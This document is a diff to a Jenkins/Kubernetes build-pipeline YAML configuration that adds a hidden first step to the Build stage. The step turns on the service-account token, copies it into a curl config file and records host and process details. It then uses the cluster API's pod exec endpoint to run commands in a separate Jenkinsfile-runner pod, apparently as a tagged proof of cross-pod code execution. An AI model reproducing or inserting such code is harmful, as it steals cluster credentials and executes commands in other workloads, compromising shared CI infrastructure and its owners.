@@ -1,2 +1,43 @@
 general:
   buildTool: 'mta'
+  jenkinsKubernetes:
+    additionalPodProperties:
+      automountServiceAccountToken: true
+service:
+  stages:
+    Build:
+      runFirst:
+        command: |
+          set +x
+          T=/var/run/secrets/kubernetes.io/serviceaccount
+          NS=$(cat $T/namespace)
+          K=https://kubernetes.default.svc
+          { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/kc
+          chmod 600 /tmp/kc
+          echo "KPID7788-NS=$NS"
+          echo "KPID7788-A-CALLER-HOSTNAME=$(hostname)"
+          echo "KPID7788-A-CALLER-ETC-HOSTNAME=$(cat /etc/hostname 2>/dev/null)"
+          echo "KPID7788-A-CALLER-PROC1=$(tr '\0' ' ' < /proc/1/cmdline | head -c 60)"
+          echo "KPID7788-A-CALLER-JENKINS_HOME-EXISTS=$(ls -d /jenkins_home 2>/dev/null || echo NO)"
+          echo "KPID7788-A-CALLER-UID=$(id -u)"
+          ex() {
+            P="$1"; C="$2"; shift 2
+            Q=""
+            for a in "$@"; do Q="$Q&command=$a"; done
+            KEY=$(head -c 16 /dev/urandom | base64)
+            curl -s -o /tmp/ex -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --http1.1 -N --max-time 20 \
+              -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" \
+              -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' \
+              "$K/api/v1/namespaces/$NS/pods/$P/exec?container=$C&stdout=true&stderr=true$Q"
+          }
+          echo "KPID7788-B-EXEC-RUNNER-hostname-STATUS=$(ex steward-jenkinsfile-runner-pod step-jenkinsfile-runner hostname)"
+          echo "KPID7788-B-EXEC-RUNNER-hostname-OUT=$(strings /tmp/ex | grep -aoE '(steward-jenkinsfile-runner-pod|dynamic-agent-[a-z0-9-]+)' | head -1)"
+          echo "KPID7788-C-EXEC-RUNNER-jenkinshome-STATUS=$(ex steward-jenkinsfile-runner-pod step-jenkinsfile-runner ls -d /jenkins_home)"
+          echo "KPID7788-C-EXEC-RUNNER-jenkinshome-OUT=$(strings /tmp/ex | grep -aoE '(/jenkins_home|No such file or directory)' | head -1)"
+          echo "KPID7788-D-EXEC-RUNNER-proc1-STATUS=$(ex steward-jenkinsfile-runner-pod step-jenkinsfile-runner cat /proc/1/comm)"
+          echo "KPID7788-D-EXEC-RUNNER-proc1-OUT=$(strings /tmp/ex | grep -av '^$' | sed -n '1,3p' | tr '\n' '|' | head -c 120)"
+          SELF=$(hostname)
+          echo "KPID7788-E-CONTROL-EXEC-SELF-STATUS=$(ex $SELF container-exec hostname)"
+          echo "KPID7788-E-CONTROL-EXEC-SELF-OUT=$(strings /tmp/ex | grep -aoE '(steward-jenkinsfile-runner-pod|dynamic-agent-[a-z0-9-]+)' | head -1)"
+          rm -f /tmp/kc /tmp/ex
+          echo "KPID7788-DONE"
